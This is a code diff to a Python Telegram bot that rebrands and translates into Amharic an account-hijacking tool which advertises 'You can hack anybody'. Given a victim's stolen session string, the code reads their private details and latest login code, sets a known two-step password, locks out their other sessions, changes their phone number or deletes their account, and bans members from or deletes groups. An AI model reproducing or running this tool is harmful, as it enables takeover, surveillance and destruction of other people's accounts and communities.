@@ -149,43 +149,47 @@ logging.basicConfig(level=logging.WARNING)
 channel = "TheXArmy"
 menu = '''
 
-**NOTICE JOIN @TheXArmy FEDERATION**
-FED ID `2936f6a8-cc1d-4f76-ac1f-ac752fe5caef`
+**NOTICE JOIN @habeshantechtricks FEDERATION**
 
 
 A: [check user own groups and channels]
+   :በተጠቃሚው የተከፈቱ ግሩፕ እና ቻናሎችን ለማወቅ
 
 B: [check user all information like phone number usrname...]
-
+   :የተጠቃሚውን ሙሉ መረጃ ልክ እንደ ስልክ ቁጥር ዩዘርኔም የመሳሰሉትን ለማወቅ
 C: [ban a group {give me StringSession and channel/group username i will ban all members there}]
-
+   :ከቡድን ለማባረር 
 D: [know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
-
+   :የተጠቃሚውን ለመጨረሻ ጊዜ የተላከለትን ሎጊን ኮድ ለማወቅ {በመጀመሪያ ምርጫ B ላይ ያለውን ተጠቀሙ (ስልኩን ለማወቅ ነገር ግን የምታውቁት ከሆነ አያስፈልግም)}
 E: [Join A Group/Channel via StringSession]
-
+   :በ ሴሽኑ ቡድን ወይም ቻናል ለመቀላቀል
 F: [Leave A Group/Channel via StringSession]
-
+   :በ ሴሽኑ ከቡድን ወይም ቻናል ለመውጣት
 G: [Delete A Group/Channel]
-
+   :ቡድን ወይም ቻናል ለመደለት
 H: [Check user two step is eneable or disable]
-
+   :ተጠቃሚው ቱ ስቴፕ ቬሪፊኬሽን እንዳበራ ለማየት
 I: [Terminate All current active sessions except Your StringSession]
-
+   :ሌሎቹን ሴሽኖች ለማጥፋት ከዚህኛው በቀር
 J: [Delete Account]
-
+   :አካውንት ለመደለት
 K: [Demote all admins in a group/channel]
-
+   :ሁሉንም የቡድን ወይም ቻናል አድሚኖች ለማስወጣት
 L: [Promote a member in a group/channel]
-
+   :አድሚን ለመሾም
 M: [Change Phone number using StringSession]
-
+   :ስልክ ቁጥር ለመቀየር 
 I ADD MORE FEATURES LATER 😆
+ሌሎች አማራጮችን በቅርቡ ጀባ እንላችኋለን ጠብቁ እስከዛው በዚህ ተከታተሉን t.me/habeshantechtricks
 '''
 mm = '''
 You can hack anybody
 Take his StringSession and use me
 I will give you full power of mine
 Type /hack
+please join my channel t.me/habeshantechtricks
+
+Devloper : @ermizamr
 '''
 @client.on(events.NewMessage(pattern="/start"))
 async def op(event):
@@ -211,167 +215,167 @@ async def op(event):
 async def start(event):
   global menu
   async with bot.conversation(event.chat_id) as x:
-    await x.send_message(f"Choose what you want with string session \n\n{menu}")
+    await x.send_message(f"Choose what you want with string session: \n ምን ማድረግ ነው ምትፈልጉት: \n\n{menu}")
     res = await x.get_response()
     r = res.text
     if res.text == "A":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION \n ሴሽኑን ያስገቡ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe \n ይህ የተቃጠለ ሴሽን ይመስለኛል😭")
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("This StringSession is terminated maybe")
+        return await event.reply("This StringSession is terminated maybe \n ይህ የተቃጠለ ሴሽን ይመስለኛል😭")
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDETAILS BY X ARMY")
+        file.write(i + "\n\nDETAILS BY Habeshan Hacking")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nThanks For using X Army Bot")
+        await event.reply(i + "\n\nThanks For using our Bot")
     elif res.text == "B":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION \n ሴሽኑን ያስገቡ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe terminated")
       i = await userinfo(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\nThanks For using our Bot")
     elif r == "C":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION \n ሴሽኑን ያስገቡ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe \n ይህ የተቃጠለ ሴሽን ይመስለኛል😭")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
-      await event.reply("Banning all members Thanks For using X Army Bot")
+      await event.reply("Banning all members Thanks For using our Bot")
     elif r == "D":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION \n ሴሽኑን ያስገቡ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe \n ይህ የተቃጠለ ሴሽን ይመስለኛል😭")
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\nThanks For using our Bot")
     elif r == "E":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION \n ሴሽኑን ያስገቡ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe \n ይህ የተቃጠለ ሴሽን ይመስለኛል😭")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
-      await event.reply("Joined the Channel/Group Thanks For using X Army Bot")
+      await event.reply("Joined the Channel/Group Thanks For using our Bot")
     elif r == "F":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION \n ሴሽኑን ያስገቡ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe \n ይህ የተቃጠለ ሴሽን ይመስለኛል😭")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await leavegroup(strses.text, grpid.text)
-      await event.reply("Leaved the Channel/Group Thanks For using X Army Bot")
+      await event.reply("Leaved the Channel/Group Thanks For using our Bot")
     elif r == "G":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION \n ሴሽኑን ያስገቡ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe \n ይህ የተቃጠለ ሴሽን ይመስለኛል😭")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using X Army Bot")
+      await event.reply("Deleted the Channel/Group Thanks For using our Bot")
     elif r == "H":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION \n ሴሽኑን ያስገቡ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe \n ይህ የተቃጠለ ሴሽን ይመስለኛል😭")
       i = await user2fa(strses.text)
       if i:
-        await event.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using X Army Bot")
+        await event.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using our Bot")
       else:
         await event.reply("Sorry User Have two step already")
     elif r == "I":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION \n ሴሽኑን ያስገቡ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe \n ይህ የተቃጠለ ሴሽን ይመስለኛል😭")
       i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using X Army Bot")
+      await event.reply("The all sessions are terminated\n\nThanks For using our Bot")
     elif res.text == "J":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION \n ሴሽኑን ያስገቡ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe \n ይህ የተቃጠለ ሴሽን ይመስለኛል😭")
       i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using X Army Bot")
+      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using our Bot")
     elif res.text == "L":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION \n ሴሽኑን ያስገቡ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe \n ይህ የተቃጠለ ሴሽን ይመስለኛል😭")
       await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
       grp = await x.get_response()
       await x.send_message("NOW GIVE USER USERNAME")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
+      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using our Bot")
     elif res.text == "K":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION \n ሴሽኑን ያስገቡ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe \n ይህ የተቃጠለ ሴሽን ይመስለኛል😭")
       await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
       pro = await x.get_response()
       try:
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
+      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using our Bot")
     elif res.text == "M":
-      await x.send_message("GIVE STRING SESSION")
+      await x.send_message("GIVE STRING SESSION \n ሴሽኑን ያስገቡ")
       strses = await x.get_response()
       op = await cu(strses.text)
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await event.respond("This StringSession is terminated maybe \n ይህ የተቃጠለ ሴሽን ይመስለኛል😭")
       await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
       number = (await x.get_response()).text
       try:
